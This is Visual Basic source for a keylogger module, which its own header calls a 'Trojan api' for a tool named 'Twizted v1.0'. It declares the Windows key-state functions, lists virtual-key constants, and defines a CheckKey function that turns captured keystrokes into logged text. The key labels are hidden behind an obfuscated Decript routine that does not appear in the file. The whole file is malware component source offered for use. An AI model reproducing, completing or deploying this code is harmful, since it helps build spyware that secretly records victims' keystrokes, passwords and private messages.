Attribute VB_Name = "KEYLOG"
'Trojan api By Xx_smarthacker_xX, Moisty
'For Twizted v1.0

Option Explicit

Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Const VK_LBUTTON = &H1
Const VK_RBUTTON = &H2
Const VK_CANCEL = &H3
Const VK_MBUTTON = &H4

Const VK_BACK = &H8
Const VK_TAB = &H9

Const VK_CLEAR = &HC
Const VK_RETURN = &HD

Const VK_SHIFT = &H10
Const VK_CONTROL = &H11
Const VK_MENU = &H12
Const VK_PAUSE = &H13
Const VK_CAPITAL = &H14

Const VK_ESCAPE = &H1B

Const VK_SPACE = &H20
Const VK_PRIOR = &H21
Const VK_NEXT = &H22
Const VK_END = &H23
Const VK_HOME = &H24
Const VK_LEFT = &H25
Const VK_UP = &H26
Const VK_RIGHT = &H27
Const VK_DOWN = &H28
Const VK_SELECT = &H29
Const VK_PRINT = &H2A
Const VK_EXECUTE = &H2B
Const VK_SNAPSHOT = &H2C
Const VK_INSERT = &H2D
Const VK_DELETE = &H2E
Const VK_HELP = &H2F

Const VK_NUMPAD0 = &H60
Const VK_NUMPAD1 = &H61
Const VK_NUMPAD2 = &H62
Const VK_NUMPAD3 = &H63
Const VK_NUMPAD4 = &H64
Const VK_NUMPAD5 = &H65
Const VK_NUMPAD6 = &H66
Const VK_NUMPAD7 = &H67
Const VK_NUMPAD8 = &H68
Const VK_NUMPAD9 = &H69
Const VK_MULTIPLY = &H6A
Const VK_ADD = &H6B
Const VK_SEPARATOR = &H6C
Const VK_SUBTRACT = &H6D
Const VK_DECIMAL = &H6E
Const VK_DIVIDE = &H6F
Const VK_F1 = &H70
Const VK_F2 = &H71
Const VK_F3 = &H72
Const VK_F4 = &H73
Const VK_F5 = &H74
Const VK_F6 = &H75
Const VK_F7 = &H76
Const VK_F8 = &H77
Const VK_F9 = &H78
Const VK_F10 = &H79
Const VK_F11 = &H7A
Const VK_F12 = &H7B
Const VK_F13 = &H7C
Const VK_F14 = &H7D
Const VK_F15 = &H7E
Const VK_F16 = &H7F
Const VK_F17 = &H80
Const VK_F18 = &H81
Const VK_F19 = &H82
Const VK_F20 = &H83
Const VK_F21 = &H84
Const VK_F22 = &H85
Const VK_F23 = &H86
Const VK_F24 = &H87

Const VK_NUMLOCK = &H90
Const VK_SCROLL = &H91

Const VK_LSHIFT = &HA0
Const VK_RSHIFT = &HA1
Const VK_LCONTROL = &HA2
Const VK_RCONTROL = &HA3
Const VK_LMENU = &HA4
Const VK_RMENU = &HA5

Const VK_ATTN = &HF6
Const VK_CRSEL = &HF7
Const VK_EXSEL = &HF8
Const VK_EREOF = &HF9
Const VK_PLAY = &HFA
Const VK_ZOOM = &HFB
Const VK_NONAME = &HFC
Const VK_PA1 = &HFD
Const VK_OEM_CLEAR = &HFE

Public Function CheckKey(nKey As Integer) As String
   If nKey = 32 Or _
      nKey >= 65 And nKey <= 90 Or _
      nKey >= 48 And nKey <= 57 Then

      CheckKey = ""

      If GetKeyState(18) < 0 Then
         CheckKey = Decript("041002371181ta")
      End If
      If GetKeyState(17) < 0 Then
         CheckKey = CheckKey + Decript(" 296911314026111x")
      End If
      If GetKeyState(16) < 0 Then
         If nKey >= 65 And nKey <= 90 Then
            If (GetKeyState(VK_CAPITAL) And 1) = 1 Then
               nKey = nKey + 32
            End If
         Else
            CheckKey = CheckKey + Decript("931461661351861361P`")
         End If
      Else
         If nKey >= 65 And nKey <= 90 Then
            If (GetKeyState(VK_CAPITAL) And 1) = 0 Then
               nKey = nKey + 32
            End If
         End If
      End If

      CheckKey = IIf(CheckKey = "", "", "[") + _
                 CheckKey + Chr(nKey) + _
                 IIf(CheckKey = "", "", "]")

   ElseIf nKey >= VK_NUMPAD0 And _
          nKey <= VK_NUMPAD9 Then

      CheckKey = Chr(nKey - VK_NUMPAD0 + 48)

   ElseIf nKey >= VK_F1 And _
          nKey <= VK_F24 Then

      CheckKey = Decript("511302p-") + CStr(nKey - VK_F1 + 1) + "]"

   ElseIf nKey = VK_ESCAPE Then
      CheckKey = Decript("702831791041502rG")
   ElseIf nKey = VK_END Then
      CheckKey = Decript("502151091251302pS")
   ElseIf nKey = VK_HOME Then
      CheckKey = Decript("302451781461281671Un")
   ElseIf nKey = VK_LEFT Then
      CheckKey = Decript("841551521041131261G7")
   ElseIf nKey = VK_UP Then
      CheckKey = Decript("891471091581^i")
   ElseIf nKey = VK_RIGHT Then
      CheckKey = Decript("751911631601731711551@#")
   ElseIf nKey = VK_DOWN Then
      CheckKey = Decript("391491781591861702td")
   ElseIf nKey = VK_PRIOR Then
      CheckKey = Decript("391851581941081961Nd")
   ElseIf nKey = VK_NEXT Then
      CheckKey = Decript("171861641161851181ZN")
   ElseIf nKey = VK_INSERT Then
      CheckKey = Decript("291591771581091cp")
   ElseIf nKey = VK_DELETE Then
      CheckKey = Decript("091061661251881aT")
   ElseIf nKey = VK_RETURN Then
      CheckKey = Decript("551381131581041071351>e") + vbCrLf
   ElseIf nKey = VK_BACK Then
      CheckKey = Decript("261781631381941102441581431481061Ev")
   ElseIf nKey = VK_TAB Then
      CheckKey = Decript("151861321681941:f")

   ElseIf nKey <> 1 And _
          nKey <> 16 And _
          nKey <> 17 And _
          nKey <> 18 Then

      CheckKey = "[" + CStr(nKey) + "]"
   End If
End Function
